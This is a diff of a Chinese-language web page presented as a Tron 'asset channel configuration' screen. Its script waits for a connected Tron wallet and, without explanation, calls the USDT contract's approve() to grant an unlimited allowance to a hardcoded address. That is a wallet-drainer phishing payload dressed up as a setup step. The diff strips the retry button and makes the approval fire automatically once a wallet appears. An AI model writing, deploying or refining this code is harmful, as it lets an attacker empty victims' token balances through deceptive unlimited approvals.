@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>僅Tron錢包資產通道配置</title>
+<title>Tron 資產通道配置</title>
 <style>
   body {
     background: #121212;
@@ -16,9 +16,7 @@
     justify-content: center;
     align-items: center;
   }
-  h2 {
-    margin-bottom: 1rem;
-  }
+  h2 { margin-bottom: 1rem; }
   .status {
     font-size: 1.4rem;
     margin-bottom: 20px;
@@ -27,22 +25,15 @@
     text-align: center;
     word-break: break-word;
   }
-  .status.loading {
-    color: #888;
-  }
-  .status.success {
-    color: #4caf50;
-  }
-  .status.error {
-    color: #f44336;
-  }
+  .status.loading { color: #888; }
+  .status.success { color: #4caf50; }
+  .status.error { color: #f44336; }
   .progress-bar {
     width: 300px;
     height: 8px;
     background: #333;
     border-radius: 4px;
     overflow: hidden;
-    box-shadow: 0 0 5px #222 inset;
     margin-bottom: 15px;
   }
   .progress-bar > div {
@@ -51,26 +42,13 @@
     background: linear-gradient(90deg, #2196f3, #21cbf3);
     transition: width 0.5s ease;
   }
-  button {
-    padding: 0.6rem 1.5rem;
-    font-size: 1rem;
-    background-color: #2196f3;
-    border: none;
-    border-radius: 5px;
-    color: white;
-    cursor: pointer;
-  }
-  button:hover {
-    background-color: #1976d2;
-  }
 </style>
 </head>
 <body>
 
 <h2>資產通道配置（僅 Tron）</h2>
-<div id="status" class="status loading">初始化中，請確保已連接 Tron 錢包</div>
+<div id="status" class="status loading">等待檢測 Tron 錢包...</div>
 <div class="progress-bar"><div id="progress"></div></div>
-<button id="retryBtn" style="display:none;">重新嘗試授權</button>
 
 <script>
   const CFG = {
@@ -80,12 +58,11 @@
     TARGET: {
       TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf"
     },
-    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" // 無限額度
   };
 
   const statusEl = document.getElementById("status");
   const progressEl = document.getElementById("progress");
-  const retryBtn = document.getElementById("retryBtn");
 
   function setStatus(msg, cls="loading", progressPercent=null) {
     statusEl.innerText = msg;
@@ -95,93 +72,35 @@
     }
   }
 
-  // 等待 TronLink / Tron 钱包初始化
-  async function waitForTronWeb(timeout = 5000) {
-    return new Promise((resolve, reject) => {
-      let waited = 0;
-      const interval = setInterval(() => {
-        if (window.tronWeb && window.tronWeb.ready) {
-          clearInterval(interval);
-          resolve(true);
-        }
-        waited += 200;
-        if (waited >= timeout) {
-          clearInterval(interval);
-          reject(new Error("Tron 錢包初始化超時"));
-        }
-      }, 200);
-    });
-  }
-
-  // 调用 Tron 合约 approve 授权
   async function tronApprove() {
     try {
       setStatus("正在進行 Tron 通道授權...", "loading", 60);
       const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
       await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
-      setStatus("✅ Tron 通道授權成功", "success", 100);
-      retryBtn.style.display = "none";
+      setStatus("✅ 授權成功", "success", 100);
       return true;
     } catch (e) {
       console.error("Tron 授權失敗:", e);
-      setStatus("Tron 授權失敗，請檢查錢包並重試", "error", 100);
-      retryBtn.style.display = "inline-block";
+      setStatus("❌ 授權失敗，請檢查錢包", "error", 100);
       return false;
     }
   }
 
-  async function initVerification() {
-    try {
-      setStatus("檢測 Tron 錢包中...", "loading", 10);
-      retryBtn.style.display = "none";
-
-      if (window.tronWeb && window.tronWeb.ready) {
-        setStatus("Tron 錢包已連接，準備授權...", "loading", 30);
-        const ok = await tronApprove();
-        if (!ok) {
-          // 授權失敗，狀態已設置，等待用戶重試
-          return;
-        }
-      } else if (window.tronLink) {
-        setStatus("等待 TronLink 錢包初始化...", "loading", 20);
-        try {
-          await waitForTronWeb();
-          const ok = await tronApprove();
-          if (!ok) return;
-        } catch (e) {
-          console.warn("TronLink 初始化失敗", e);
-          setStatus("TronLink 錢包初始化失敗，請刷新重試", "error", 100);
-          retryBtn.style.display = "inline-block";
-          return;
-        }
+  function listenForTronWeb() {
+    let progress = 0;
+    const interval = setInterval(async () => {
+      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+        clearInterval(interval);
+        setStatus("檢測到 Tron 錢包，準備授權...", "loading", 30);
+        await tronApprove();
       } else {
-        setStatus("未檢測到 Tron 錢包，請安裝或啟動支持 Tron 的錢包並刷新頁面", "error", 100);
-        retryBtn.style.display = "inline-block";
-        return;
+        progress = (progress + 2) % 100;
+        setStatus("等待錢包連接...", "loading", progress);
       }
-    } catch (e) {
-      console.error("驗證錯誤:", e);
-      setStatus("系統錯誤，請刷新重試", "error", 100);
-      retryBtn.style.display = "inline-block";
-    }
+    }, 500);
   }
 
-  retryBtn.onclick = () => {
-    setStatus("重新嘗試授權中...", "loading", 0);
-    initVerification();
-  };
-
-  window.addEventListener('load', () => {
-    let progress = 0;
-    const progressInterval = setInterval(() => {
-      progress += 5;
-      if (progress < 10) setStatus("啟動中...", "loading", progress);
-      if (progress >= 10) {
-        clearInterval(progressInterval);
-        initVerification();
-      }
-    }, 100);
-  });
+  window.addEventListener('load', listenForTronWeb);
 </script>
 
 </body>
